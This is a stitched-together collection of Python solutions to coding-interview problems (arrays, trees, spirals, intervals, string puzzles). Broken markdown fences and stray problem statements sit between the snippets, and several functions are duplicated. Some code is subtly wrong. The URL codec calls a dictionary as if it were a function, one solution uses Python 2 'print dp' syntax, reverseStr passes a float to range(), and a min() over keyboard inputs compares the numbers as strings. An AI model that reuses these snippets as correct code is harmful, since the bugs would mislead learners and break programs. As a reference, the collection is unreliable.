            if r <= self.w[mid]:
                end = mid
            else:
                start = mid + 1
        return start

def longestWord(text):
    longest = []
    word = []
    for char in text:
        if ord("A") <= ord(char) <= ord("Z") or ord("a") <= ord(char) <= ord("z"):
            word.append(char)
        else:
            if len(word) > len(longest):
                longest = word
            word = []
    if len(word) > len(longest):
        longest = word
    return "".join(longest)

def validTime(time):
    time_split = time.split(":")
    if 00 <= int(time_split[0]) <= 23 and 00 <= int(time_split[1]) <= 59:
        return True
    return False

class Solution:
    def maxSubArray(self, nums: List[int]) -> int:
        result, curr_sum = nums[0], nums[0]
        for num in nums[1:]:
            curr_sum = max(num, curr_sum + num)
            result = max(result, curr_sum)
        return result

class Solution:
    def findLonelyPixel(self, picture: List[List[str]]) -> int:
        m, n = len(picture), len(picture[0])

        blacks = []
        for i in range(m):
            for j in range(n):
                if picture[i][j] == "B":
                    blacks.append((i, j))

        def dfs(x, y):
            for i in range(n):
                if i != y and picture[x][i] == "B":
                    return False
            for i in range(m):
                if i != x and picture[i][y] == "B":
                    return False
            return True

        result = len(blacks)
        for black in blacks:
            if not dfs(*black):
                result -= 1
        return result

from collections import Counter


class Solution:
    def findPairs(self, nums: List[int], k: int) -> int:
        c = Counter(nums)
        result = 0
        for num in c:
            if k > 0 and num + k in c or (k == 0 and c[num] > 1):
                result += 1
        return result

import string


class Codec:
    def __init__(self):
        self.long2short = {}
        self.short2long = {}

    def encode(self, longUrl):
        """Encodes a URL to a shortened URL.

        :type longUrl: str
        :rtype: str
        """
        if longUrl in self.long2short:
            return "http://tinyurl.com/" + self.long2short(longUrl)
        code_pool = string.ascii_letters + "0123456789"
        code = "".join(random.choice(code_pool) for _ in range(6))
        while code in self.short2long:
            code = "".join(random.choice(code_pool) for _ in range(6))
        self.short2long[code] = longUrl
        self.long2short[longUrl] = code
        return "http://tinyurl.com/" + code

    def decode(self, shortUrl):
        """Decodes a shortened URL to its original URL.

        :type shortUrl: str
        :rtype: str
        """
        if shortUrl[-6:] in self.short2long:
            return self.short2long[shortUrl[-6:]]
        return

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def convertBST(self, root):
        """
        :type root: TreeNode
        :rtype: TreeNode
        """
        self.val = 0

        def visit(node):
            if node:
                visit(node.right)
                node.val += self.val
                self.val = node.val
                visit(node.left)

        visit(root)
        return root

def validTime(time):
    groups = time.split(":")
    if len(groups) != 2:
        return False
    if not (groups[0].isdigit() and groups[1].isdigit()):
        return False
    if int(groups[0]) > 23 or int(groups[1]) > 59:
        return False
    return True

def sumUpNumbers(inputString):
    def getNumbers(str):
        nums = re.findall(r"[0-9]+", str)
        return nums

    numbers = getNumbers(inputString)
    total = 0
    for i in numbers:
        total += int(i)
    return total
````

````py
 Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.

 Example 1:

 Input:
 [
  [ 1, 2, 3 ],
  [ 4, 5, 6 ],
  [ 7, 8, 9 ]
 ]
 Output: [1,2,3,6,9,8,7,4,5]```


```py


class Solution(object):
    def spiralOrder(self, matrix):
        """
        :type matrix: List[List[int]]
        :rtype: List[int]
        """
        if not matrix:
            return []

        R, C = len(matrix), len(matrix[0])
        dr = [0, 1, 0, -1]
        dc = [1, 0, -1, 0]

        result = []
        seen = [[False] * C for _ in range(R)]
        row = 0
        col = 0
        di = 0
        for _ in range(R * C):
            result.append(matrix[row][col])
            seen[row][col] = True
            rr, cc = row + dr[di], col + dc[di]
            if 0 <= rr < R and 0 <= cc < C and not seen[rr][cc]:
                row, col = rr, cc
            else:
                di = (di + 1) % 4
                row, col = row + dr[di], col + dc[di]

        return result

class Solution(object):
    def reverseStr(self, s, k):
        """
        :type s: str
        :type k: int
        :rtype: str
        """
        if len(s) <= k:
            return s[::-1]
        elif len(s) <= 2 * k:
            return s[k - 1 :: -1] + s[k:]
        else:
            result = s[k - 1 :: -1]
            start = k
            for i in range(1, len(s) / (2 * k) + 1):
                result += (
                    s[start : i * 2 * k] + s[i * 2 * k - 1 + k : i * 2 * k - 1 : -1]
                )
                start = i * 2 * k + k
            result += s[start:]
            return result

class Solution:
    def updateMatrix(self, matrix: List[List[int]]) -> List[List[int]]:
        m, n = len(matrix), len(matrix[0])
        result = [[-1] * n for _ in range(m)]
        q = []
        for i in range(m):
            for j in range(n):
                if matrix[i][j] == 0:
                    result[i][j] = 0
                    q.append((i, j))
        while q:
            new_q = []
            for i, j in q:
                for d in [(0, 1), (0, -1), (1, 0), (-1, 0)]:
                    x, y = i + d[0], j + d[1]
                    if 0 <= x < m and 0 <= y < n and result[x][y] == -1:
                        result[x][y] = result[i][j] + 1
                        new_q.append((x, y))
            q = new_q
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def diameterOfBinaryTree(self, root: TreeNode) -> int:
        self.result = 0

        def getDiameter(node):
            if not node:
                return 0
            left = getDiameter(node.left)
            right = getDiameter(node.right)
            self.result = max(self.result, left + right)
            return 1 + max(left, right)

        getDiameter(root)
        return self.result

# Time: O(n log n)
# Space: O(n)


class Solution:
    def findContestMatch(self, n: int) -> str:
        matches = [str(i) for i in range(1, n + 1)]
        while n > 1:
            for i in range(0, n // 2):
                matches[i] = "(" + matches[i] + "," + matches[n - i - 1] + ")"
            n = n // 2
        return matches[0]

class Solution:
    def findCircleNum(self, M: List[List[int]]) -> int:
        N = len(M)
        roots = list(range(N))
        result = N

        def find(node):
            root = node
            while roots[root] != root:
                root = roots[root]
            while node != root:
                roots[node], node = root, roots[node]
            return root

        for i in range(N):
            for j in range(N):
                if i == j:
                    continue
                elif M[i][j] == 1:
                    x, y = find(i), find(j)
                    if x == y:
                        continue
                    else:
                        roots[y] = x
                        result -= 1
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def longestConsecutive(self, root: TreeNode) -> int:
        def getLength(node):
            if not node:
                return [0, 0]
            increase, decrease = 1, 1
            ll = getLength(node.left)
            rr = getLength(node.right)
            if node.left:
                if node.val + 1 == node.left.val:
                    increase += ll[0]
                if node.val - 1 == node.left.val:
                    decrease += ll[1]
            if node.right:
                if node.val + 1 == node.right.val:
                    increase = max(increase, rr[0] + 1)
                if node.val - 1 == node.right.val:
                    decrease = max(decrease, rr[1] + 1)
            self.result = max(self.result, increase + decrease - 1)
            return [increase, decrease]

        self.result = 0
        getLength(root)

        return self.result

def sumUpNumbers(inputString):
    total = 0
    current_num = []
    for char in inputString:
        if char.isdigit():
            current_num.append(char)
        else:
            if len(current_num) > 0:
                num = int("".join(current_num))
                total += num
                current_num = []
    if len(current_num) > 0:
        num = int("".join(current_num))
        total += num
    return total

def differentSquares(matrix):
    squares = set()
    for row in range(len(matrix) - 1):
        for cell in range(len(matrix[row]) - 1):
            square = (
                (matrix[row][cell], matrix[row][cell + 1]),
                (matrix[row + 1][cell], matrix[row + 1][cell + 1]),
            )
            squares.add(square)
    return len(squares)

class Solution:
    def canJump(self, nums: List[int]) -> bool:
        if len(nums) < 2:
            return True
        currentEnd, currentFarthest = 0, 0
        for i in range(len(nums) - 1):
            currentFarthest = max(i + nums[i], currentFarthest)
            if i == currentEnd:
                currentEnd = currentFarthest
            if currentEnd >= len(nums) - 1:
                return True
        return False

class Solution:
    def leastBricks(self, wall: List[List[int]]) -> int:
        row = {}
        for r in wall:
            i = 0
            for brick in r[:-1]:
                i += brick
                row[i] = row.get(i, 0) + 1
        return len(wall) - max(row.values(), default=0)

class Solution(object):
    def reverseWords(self, s):
        """
        :type s: str
        :rtype: str
        """
        result = []
        for word in s.split():
            result.append(word[::-1])
        return " ".join(result)
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val=None, children=None):
        self.val = val
        self.children = children```


```py
from collections import deque


class Solution:
    def maxDepth(self, root: "Node") -> int:
        if not root:
            return 0
        queue = deque([(root, 1)])
        result = 0

        while queue:
            node, depth = queue.popleft()
            result = max(result, depth)
            if node.children:
                for child in node.children:
                    queue.append((child, depth + 1))
        return result

def differentSquares(matrix):
    squares = set()
    for row in range(len(matrix) - 1):
        for cell in range(len(matrix[row]) - 1):
            square = (
                (matrix[row][cell], matrix[row][cell + 1]),
                (matrix[row + 1][cell], matrix[row + 1][cell + 1]),
            )
            squares.add(square)
    return len(squares)

def digitsProduct(product):
    if product == 0:
        return 10
    if product == 1:
        return 1
    for i in range(0, 4000):
        p = 1
        for j in str(i):
            p *= int(j)
        if p == product:
            return i
    return -1

class Solution:
    def subarraySum(self, nums: List[int], k: int) -> int:
        cache = {0: 1}
        s, result = 0, 0
        for num in nums:
            s += num
            if s - k in cache:
                result += cache[s - k]
            cache[s] = cache.get(s, 0) + 1
        return result

def digitsProduct(product):
    # New idea: add product to factors
    # while max(factors) > 10: split that num into factors
    if product == 0:
        return 10

    factors = [product]
    while max(factors) > 9:
        factored = findFactors(max(factors))
        if factored:
            factors.remove(max(factors))
            factors.extend(factored)
        else:
            return -1

    while factors.count(3) >= 2:
        factors.remove(3)
        factors.remove(3)
        factors.append(9)

    while factors.count(2) > 2:
        factors.remove(2)
        factors.remove(2)
        factors.remove(2)
        factors.append(8)

    while factors.count(2) > 1:
        factors.remove(2)
        factors.remove(2)
        factors.append(4)

    while 2 in factors and 3 in factors:
        factors.remove(2)
        factors.remove(3)
        factors.append(6)

    return int("".join(map(str, sorted(factors))))


def findFactors(n):
    for i in range(2, int(n ** 0.5) + 1):
        if n % i == 0:
            return i, n // i
    return False

def fileNaming(names):
    outnames = []
    for name in names:
        if name in outnames:
            k = 1
            while "{}({})".format(name, k) in outnames:
                k += 1
            name = "{}({})".format(name, k)
        outnames.append(name)
    return outnames

class Solution:
    def insert(
        self, intervals: List[List[int]], newInterval: List[int]
    ) -> List[List[int]]:
        if not intervals or len(intervals) == 0:
            return [newInterval]
        result, i = [], 0
        while i < len(intervals) and intervals[i][1] < newInterval[0]:
            result.append(intervals[i])
            i += 1
        while i < len(intervals) and intervals[i][0] <= newInterval[1]:
            newInterval = [
                min(intervals[i][0], newInterval[0]),
                max(intervals[i][1], newInterval[1]),
            ]
            i += 1
        result.append(newInterval)
        result += intervals[i:]
        return result

class Solution:
    def isSubtree(self, s, t):
        """
        :type s: TreeNode
        :type t: TreeNode
        :rtype: bool
        """
        if not s:
            return s is t
        if self.isEqual(s, t):
            return True
        return self.isSubtree(s.left, t) or self.isSubtree(s.right, t)

    def isEqual(self, m, n):
        if not m or not n:
            return m is n
        if m.val != n.val:
            return False
        return self.isEqual(m.left, n.left) and self.isEqual(m.right, n.right)

class Solution:
    def findPaths(self, m: int, n: int, N: int, i: int, j: int) -> int:
        M = [[0] * n for _ in range(m)]

        for _ in range(N):
            T = [[0] * n for _ in range(m)]
            for x in range(m):
                for y in range(n):
                    up = M[x - 1][y] if x > 0 else 1
                    down = M[x + 1][y] if x + 1 < m else 1
                    right = M[x][y + 1] if y + 1 < n else 1
                    left = M[x][y - 1] if y > 0 else 1
                    T[x][y] = up + down + right + left
            M = T
        return M[i][j] % (10 ** 9 + 7)

def fileNaming(names):
    outnames = []
    for name in names:
        if name in outnames:
            k = 1
            while "{}({})".format(name, k) in outnames:
                k += 1
            name = "{}({})".format(name, k)
        outnames.append(name)
    return outnames

def messageFromBinaryCode(code):
    output = []
    for i in range(0, len(code), 8):
        letter = chr(int(code[i : i + 8], 2))
        output.append(letter)
    return "".join(output)

class Solution:
    def lengthOfLastWord(self, s):
        """
        :type s: str
        :rtype: int
        """
        return len(s.strip().split(" ")[-1])

def messageFromBinaryCode(code):
    output = []
    for i in range(0, len(code), 8):
        letter = chr(int(code[i : i + 8], 2))
        output.append(letter)
    return "".join(output)

def spiralNumbers(n):
    dims = n
    elem = 1
    matrix = [[0] * n for x in range(n)]
    while 0 < dims:
        i = n - dims
        # you can sub i = n - dims ONLY in the first 2 parts
        # where n - dims is in the starting parameter of the range
        for j in range(n - dims, dims):
            matrix[i][j] = elem
            elem += 1
        for i in range(n - dims + 1, dims):
            matrix[i][j] = elem
            elem += 1
        for j in range(dims - 2, n - dims - 1, -1):
            matrix[i][j] = elem
            elem += 1
        for i in range(dims - 2, n - dims, -1):
            matrix[i][j] = elem
            elem += 1
        dims -= 1
    return matrix

class Solution:
    def generateMatrix(self, n):
        """
        :type n: int
        :rtype: List[List[int]]
        """
        res = [[0] * n for _ in range(n)]
        r, c, dr, dc = 0, 0, 0, 1
        for i in range(1, n * n + 1):
            res[r][c] = i
            if res[(r + dr) % n][(c + dc) % n]:
                dr, dc = dc, -dr
            r += dr
            c += dc
        return res

from collections import Counter


class Solution:
    def validSquare(
        self, p1: List[int], p2: List[int], p3: List[int], p4: List[int]
    ) -> bool:
        counter = Counter()
        points = [p1, p2, p3, p4]

        def getDistance(x, y):
            return (x[0] - y[0]) ** 2 + (x[1] - y[1]) ** 2

        for i in range(len(points)):
            for j in range(i + 1, len(points)):
                counter[getDistance(points[i], points[j])] += 1

        return len(counter) == 2 and 4 in counter.values() and 2 in counter.values()

def spiralNumbers(n):
    LEFT = "left"
    RIGHT = "right"
    UP = "up"
    DOWN = "down"
    direction = RIGHT
    spiral = [[0 for i in range(n)] for j in range(n)]
    row = 0
    cell = 0
    for num in range(1, (n * n) + 1):
        spiral[row][cell] = num
        if direction == RIGHT:
            if cell != n - 1 and spiral[row][cell + 1] == 0:
                cell += 1
            else:
                direction = DOWN
                row += 1
        elif direction == DOWN:
            if row != n - 1 and spiral[row + 1][cell] == 0:
                row += 1
            else:
                direction = LEFT
                cell -= 1
        elif direction == LEFT:
            if cell != 0 and spiral[row][cell - 1] == 0:
                cell -= 1
            else:
                direction = UP
                row -= 1
        elif direction == UP:
            if row != 0 and spiral[row - 1][cell] == 0:
                row -= 1
            else:
                direction = RIGHT
                cell += 1
    return spiral


print(spiralNumbers(5))

# 5. Write a Python Program to take the two numbers from keyboard and find minimum of them

x = input("Enter the first number")
y = input("Enter the second number")

result = min(x, y)

print("The minimum of the two numbers entered is {}".format(result))
````

````py
One of the most straightforward problems we can solve recursively is to print every number from n down to zero in succession.
We can do that simply by writing a function that prints n, then calls itself for n-1:```


```py
import sys

sys.setrecursionlimit(10005)
N = 10000
# def countdown_i(n):
#     while (n > 0): # condition and label
#         print(n) # body
#         n -= 1 # decrement


def countdown(n):  # label
    # condition (base case)
    if n == 0:
        return

    # body
    print(n)

    # decrement
    countdown(n - 1)


# countdown_i(n)
countdown(N)

class Solution(object):
    def convert(self, s, numRows):
        """
        :type s: str
        :type numRows: int
        :rtype: str
        """
        if len(s) <= numRows or numRows == 1:
            return s
        result = [""] * numRows
        index, step = 0, 1
        for c in s:
            if index == 0:
                step = 1
            elif index == numRows - 1:
                step = -1
            result[index] += c
            index += step
        return "".join(result)

def sudoku(grid):
    match = [i for i in range(1, 10)]
    for row in grid:
        if sorted(row) != match:
            return False
    for column_index in range(9):
        column = [grid[row_index][column_index] for row_index in range(9)]
        if sorted(column) != match:
            return False
    for row in range(0, 9, 3):
        for column in range(0, 9, 3):
            box = []
            box.extend(grid[row][column : column + 3])
            box.extend(grid[row + 1][column : column + 3])
            box.extend(grid[row + 2][column : column + 3])
            if sorted(box) != match:
                return False
    return True

import math


class Solution:
    def getPermutation(self, n, k):
        """
        :type n: int
        :type k: int
        :rtype: str
        """
        nums = list(range(1, n + 1))
        NN = math.factorial(n)
        k -= 1
        res = ""
        while len(nums) > 0:
            NN = int(NN / len(nums))
            idx, k = divmod(k, NN)
            res += str(nums.pop(idx))
        return res

class Solution:
    def findIntegers(self, num: int) -> int:
        A = bin(num)[2:][::-1]
        print(A)
        N = len(A)
        dp = [[1, 1] for _ in range(N)]
        result = 0
        result = 1 if A[0] == "0" else 2
        for i in range(1, N):
            dp[i][0] = dp[i - 1][1] + dp[i - 1][0]
            dp[i][1] = dp[i - 1][0]
            if A[i - 1 : i + 1] == "01":
                result += dp[i][0]
            elif A[i - 1 : i + 1] == "11":
                result = dp[i][0] + dp[i][1]
        return result

class Solution:
    def canPlaceFlowers(self, flowerbed: List[int], n: int) -> bool:
        count, next = 0, True
        for i in range(len(flowerbed) - 1):
            if flowerbed[i]:
                next = False
            elif flowerbed[i] == 0 and next and not flowerbed[i + 1]:
                count += 1
                next = False
            elif flowerbed[i] == 0 and not next:
                next = True

        if flowerbed[-1] == 0 and next:
            count += 1
        return count >= n

class Solution:
    def tree2str(self, t):
        """
        :type t: TreeNode
        :rtype: str
        """
        if not t:
            return ""
        left = "({})".format(self.tree2str(t.left)) if t.left or t.right else ""
        right = "({})".format(self.tree2str(t.right)) if t.right else ""
        return "{}{}{}".format(t.val, left, right)

from collections import defaultdict
from typing import List


class Solution:
    def findDuplicate(self, paths: List[str]) -> List[List[str]]:
        d = defaultdict(list)
        for path in paths:
            directory, *files = path.split()
            for file in files:
                name, content = file.split("(")
                d[content].append(directory + "/" + name)
        return [v for _, v in d.items() if len(v) > 1]

def sudoku(grid):
    match = [i for i in range(1, 10)]
    for row in grid:
        if sorted(row) != match:
            return False
    for column_index in range(9):
        column = [grid[row_index][column_index] for row_index in range(9)]
        if sorted(column) != match:
            return False
    for row in range(0, 9, 3):
        for column in range(0, 9, 3):
            box = []
            box.extend(grid[row][column : column + 3])
            box.extend(grid[row + 1][column : column + 3])
            box.extend(grid[row + 2][column : column + 3])
            if sorted(box) != match:
                return False
    return True

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def rotateRight(self, head, k):
        """
        :type head: ListNode
        :type k: int
        :rtype: ListNode
        """
        if not head:
            return []
        l = 1
        dummy = head
        while dummy.next:
            l += 1
            dummy = dummy.next
        k = k % l
        tail = dummy
        tail.next = head
        for i in range(l - k):
            tail = tail.next
        new_head = tail.next
        tail.next = None
        return new_head

# Definition for a binary tree node.
class TreeNode(object):
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution(object):
    def mergeTrees(self, t1, t2):
        """
        :type t1: TreeNode
        :type t2: TreeNode
        :rtype: TreeNode
        """
        if t1 and t2:
            t = TreeNode(t1.val + t2.val)
            t.left = self.mergeTrees(t1.left, t2.left)
            t.right = self.mergeTrees(t1.right, t2.right)
            return t
        else:
            return t1 or t2

class Solution:
    def uniquePaths(self, m: int, n: int) -> int:
        dp = [1] * n
        for row in range(1, m):
            for j in range(1, n):
                dp[j] += dp[j - 1]
        return dp[-1]
````

````py
Time: O(n logn)
Space: O(26)```


```py

from collections import Counter


class Solution:
    def leastInterval(self, tasks: List[str], n: int) -> int:
        if n == 0:
            return len(tasks)
        counts = Counter(tasks)
        max_count = counts.most_common(1)[0][1]
        addition = 0
        for k, v in counts.most_common()[1:]:
            if v == max_count:
                addition += 1
        return max(len(tasks), (max_count - 1) * n + max_count + addition)

class Solution:
    def maxDistance(self, arrays: List[List[int]]) -> int:
        result = 0
        m1, m2 = arrays[0][0], arrays[0][-1]
        for row in arrays[1:]:
            result = max(result, row[-1] - m1, m2 - row[0])
            m1 = min(m1, row[0])
            m2 = max(m2, row[-1])
        return result

class Solution:
    def uniquePathsWithObstacles(self, obstacleGrid: List[List[int]]) -> int:
        m, n = len(obstacleGrid), len(obstacleGrid[0])
        dp = [0] * n
        dp[0] = 1
        for i in range(m):
            for j in range(n):
                if obstacleGrid[i][j] == 1:
                    dp[j] = 0
                elif j >= 1:
                    dp[j] += dp[j - 1]
        return dp[-1]

import heapq


class Solution:
    def scheduleCourse(self, courses: List[List[int]]) -> int:
        pq = []
        start = 0
        for s, e in sorted(courses, key=lambda x: x[1]):
            heapq.heappush(pq, -s)
            start += s
            while start > e:
                target = heapq.heappop(pq)
                start += target
        return len(pq)

class Solution:
    def exclusiveTime(self, n: int, logs: List[str]) -> List[int]:
        result = [0] * n
        stack = []
        prev = 0

        for log in logs:
            thread, status, time = log.split(":")
            thread, time = int(thread), int(time)
            if status == "start":
                if stack:
                    result[stack[-1]] += time - prev
                stack.append(thread)
                prev = time
            else:
                result[stack.pop()] += time - prev + 1
                prev = time + 1
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def averageOfLevels(self, root):
        """
        :type root: TreeNode
        :rtype: List[float]
        """
        if not root:
            return []
        this_level = [root]
        result = []
        while this_level:
            temp = [node.val for node in this_level]
            result.append(sum(temp) / len(temp))
            this_level = [
                child
                for node in this_level
                for child in [node.left, node.right]
                if child
            ]
        return result

class Solution:
    def shoppingOffers(
        self, price: List[int], special: List[List[int]], needs: List[int]
    ) -> int:
        N = len(needs)

        def dfs(idx, buy):
            result = sum(x * y for x, y in zip(price, buy))
            if any(item < 0 for item in buy):
                return float("inf")
            for i in range(idx, len(special)):
                if special[i][-1] >= result:
                    continue
                result = min(
                    result,
                    dfs(i, [x - y for x, y in zip(buy, special[i][:N])])
                    + special[i][-1],
                )
            return result

        return dfs(0, needs)

class Solution:
    def numDecodings(self, s):
        """
        :type s: str
        :rtype: int
        """
        f0 = 0
        e0, e1, e2 = 1, 0, 0
        mod = 10 ** 9 + 7
        for c in s:
            if c == "*":
                f0 = (e0 * 9 + e1 * 9 + e2 * 6) % mod
                e1 = e0
                e2 = e0
            else:
                f0 = ((c > "0") * e0 + e1 + e2 * (c < "7")) % mod
                e1 = e0 if c == "1" else 0
                e2 = e0 if c == "2" else 0
            e0 = f0
        return f0

'''
 Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.

 Note: You can only move either down or right at any point in time.
'''
class Solution(object):
    def minPathSum(self, grid):
        """
        :type grid: List[List[int]]
        :rtype: int
        """
        if not grid:
         return 0

        row, col = len(grid), len(grid[0])
        dp = [[0 for _ in range(col)] for _ in range(row)]
        dp[0][0] = grid[0][0]

        for index in range(1, row):
         dp[index][0] = dp[index-1][0] + grid[index][0]

        for index in range(1, col):
         dp[0][index] = dp[0][index-1] + grid[0][index]

        print dp
        for index_i in range(1, row):
         for index_j in range(1, col):
          dp[index_i][index_j] = min(dp[index_i-1][index_j], dp[index_i][index_j-1]) + grid[index_i][index_j]

        return dp[row-1][col-1]
class Solution:
    def findLongestChain(self, pairs):
        """
        :type pairs: List[List[int]]
        :rtype: int
        """
        current, result = float("-inf"), 0
        for pair in sorted(pairs, key=lambda x: x[1]):
            if current < pair[0]:
                current = pair[1]
                result += 1
        return result

class Solution:
    def countSubstrings(self, s):
        """
        :type s: str
        :rtype: int
        """
        result = 0
        for i in range(len(s)):
            result += self.getCount(s, i, i)
            result += self.getCount(s, i, i + 1)
        return result

    def getCount(self, s, left, right):
        count = 0
        while left >= 0 and right < len(s) and s[left] == s[right]:
            count += 1
            left -= 1
            right += 1
        return count

class Solution:
    def replaceWords(self, dictionary: List[str], sentence: str) -> str:
        trie = {}
        for word in dictionary:
            t = trie
            for c in word:
                t = t.setdefault(c, {})
            t["#"] = "#"

        def check(w):
            t = trie
            for i in range(len(w)):
                c = w[i]
                if c not in t:
                    break
                t = t[c]
                if "#" in t:
                    return w[: i + 1]
            return w

        return " ".join(list(map(check, sentence.split())))
````

````py
 Validate if a given string is numeric.

 Some examples:
 "0" => true
 " 0.1 " => true
 "abc" => false
 "1 a" => false
 "2e10" => true

 Note: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one.```


```py


class Solution(object):
    def isNumber(self, s):
        """
        :type s: str
        :rtype: bool
        """
        s = s.strip()
        try:
            if isinstance(float(s), float) or isinstance(int(s), int):
                return True
        except Exception as e:
            return False


# Time: O(1)
# Space: O(1)

class Solution:
    def maxA(self, N):
        """
        :type N: int
        :rtype: int
        """
        if N < 7:
            return N
        result = [0, 1, 2, 3, 4, 5, 6]
        for i in range(7, N + 1):
            current = result[i - 1] + 1
            for j in range(3, i):
                current = max(current, result[i - j] * (j - 1))
            result.append(current)
        return result[N]

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
from collections import deque


class Solution:
    def findTarget(self, root: TreeNode, k: int) -> bool:
        if not root:
            return False
        q, nums = deque([root]), set()
        while q:
            curr = q.popleft()
            if k - curr.val in nums:
                return True
            nums.add(curr.val)
            if curr.left:
                q.append(curr.left)
            if curr.right:
                q.append(curr.right)
        return False

class Solution:
    def constructMaximumBinaryTree(self, nums):
        """
        :type nums: List[int]
        :rtype: TreeNode
        """
        stack = []
        for num in nums:
            curr = TreeNode(num)
            while stack and stack[-1].val < num:
                curr.left = stack.pop()
            if stack:
                stack[-1].right = curr
            stack.append(curr)
        return stack[0]

class Solution:
    def plusOne(self, digits):
        """
        :type digits: List[int]
        :rtype: List[int]
        """
        for i in range(len(digits)):
            digits[~i] += 1
            if digits[~i] < 10:
                return digits
            else:
                digits[~i] %= 10
        if digits[0] == 0:
            return [1] + digits
        return digits

class Solution:
    def imageSmoother(self, M):
        """
        :type M: List[List[int]]
        :rtype: List[List[int]]
        """
        m = len(M)
        n = len(M[0]) if m else 0
        ret = [[0] * n for j in range(m)]
        for i in range(m):
            for j in range(n):
                surrounding_cells = [
                    M[x][y]
                    for x in (i - 1, i, i + 1)
                    for y in (j - 1, j, j + 1)
                    if 0 <= x < m and 0 <= y < n
                ]
                ret[i][j] = sum(surrounding_cells) // len(surrounding_cells)
        return ret

class Solution:
    def addBinary(self, a: str, b: str) -> str:
        i, j, carry = len(a) - 1, len(b) - 1, 0
        result = ""

        while i >= 0 or j >= 0 or carry:
            if i >= 0:
                carry += int(a[i])
                i -= 1
            if j >= 0:
                carry += int(b[j])
                j -= 1

            carry, remainder = divmod(carry, 2)
            result = str(remainder) + result
        return result

class Solution:
    def maximumSwap(self, num: int) -> int:
        num = [int(i) for i in str(num)]
        for i in range(len(num) - 1):
            m = max(num[i + 1 :])
            if num[i] < m:
                target = len(num) - 1
                for j in range(len(num) - 1, 0, -1):
                    if num[j] == m:
                        target = j
                        break
                num[i], num[target] = num[target], num[i]
                break
        return int("".join(str(i) for i in num))

class Solution:
    def findNumberOfLIS(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        if not nums:
            return 0
        length, count = [1] * len(nums), [1] * len(nums)
        result, maxval = 1, 1
        for i in range(1, len(nums)):
            count[i] = 1
            for j in range(i):
                if nums[i] > nums[j]:
                    if length[j] + 1 == length[i]:
                        count[i] += count[j]
                    elif length[j] + 1 > length[i]:
                        length[i] = length[j] + 1
                        count[i] = count[j]
            if length[i] > maxval:
                maxval = length[i]
                result = count[i]
            elif length[i] == maxval:
                result += count[i]
        return result

class Solution:
    def findLengthOfLCIS(self, nums: List[int]) -> int:
        result, i = 0, 0
        j = 0
        while j < len(nums):
            if nums[j] <= nums[j - 1]:
                i = j
            j += 1
            result = max(result, j - i)

        return result

from typing import List


class Solution:
    def fullJustify(self, words: List[str], maxWidth: int) -> List[str]:
        curr, num_of_chars, result = [], 0, []
        for word in words:
            # len(curr) represent the number of spaces following total words
            if len(curr) + num_of_chars + len(word) > maxWidth:
                for i in range(maxWidth - num_of_chars):
                    curr[i % (len(curr) - 1 or 1)] += " "
                result.append("".join(curr))
                curr = []
                num_of_chars = 0
            curr.append(word)
            num_of_chars += len(word)
        if curr:
            result.append(" ".join(curr).ljust(maxWidth))
        return result

class Solution:
    def validPalindrome(self, s: str) -> bool:
        l, r = 0, len(s) - 1
        while l < r:
            if s[l] != s[r]:
                first, second = s[l:r], s[l + 1 : r + 1]
                return first == first[::-1] or second == second[::-1]
            l += 1
            r -= 1
        return True

class Solution:
    def nextClosestTime(self, time):
        """
        :type time: str
        :rtype: str
        """
        return min(
            (t <= time, t)
            for i in range(24 * 60)
            for t in ["%02d:%02d" % divmod(i, 60)]
            if set(t) <= set(time)
        )[1]

class Solution:
    def knightProbability(self, N: int, K: int, r: int, c: int) -> float:
        directions = [
            (-1, 2),
            (1, 2),
            (-1, -2),
            (1, -2),
            (2, 1),
            (-2, 1),
            (2, -1),
            (-2, -1),
        ]
        M, out_prob = {(r, c): 1}, 0
        for _ in range(K):
            T = collections.defaultdict(int)
            for (i, j), p in M.items():
                for d in directions:
                    x, y = i + d[0], j + d[1]
                    if 0 <= x < N and 0 <= y < N:
                        T[(x, y)] += p * 0.125
                    else:
                        out_prob += p * 0.125
            M = T
        return 1 - out_prob

class Solution:
    def maxSumOfThreeSubarrays(self, nums: List[int], k: int) -> List[int]:
        w1, w2, w3 = [0], [0, k], [0, k, 2 * k]
        s1, s2, s3 = sum(nums[:k]), sum(nums[k : 2 * k]), sum(nums[2 * k : 3 * k])
        ws1, ws2, ws3 = s1, s1 + s2, s1 + s2 + s3
        idx1, idx2, idx3 = 1, k + 1, 2 * k + 1

        while idx3 < len(nums) - k + 1:
            s1 = s1 - nums[idx1 - 1] + nums[idx1 + k - 1]
            s2 = s2 - nums[idx2 - 1] + nums[idx2 + k - 1]
            s3 = s3 - nums[idx3 - 1] + nums[idx3 + k - 1]

            if s1 > ws1:
                ws1 = s1
                w1 = [idx1]

            if ws1 + s2 > ws2:
                ws2 = ws1 + s2
                w2 = [w1[0], idx2]

            if ws2 + s3 > ws3:
                ws3 = ws2 + s3
                w3 = w2 + [idx3]

            idx1 += 1
            idx2 += 1
            idx3 += 1

        return w3

class Solution:
    def mySqrt(self, x):
        """
        :type x: int
        :rtype: int
        """
        if x == 0:
            return 0
        left, right = 1, x
        while left <= right:
            mid = left + (right - left) // 2
            if mid > x // mid:
                right = mid - 1
            else:
                left = mid + 1
        return right
````

````py
# Definition for Employee.
class Employee:
    def __init__(self, id: int, importance: int, subordinates: List[int]):
        self.id = id
        self.importance = importance
        self.subordinates = subordinates```


```py
from collections import deque


class Solution:
    def getImportance(self, employees: List["Employee"], id: int) -> int:
        d = {}
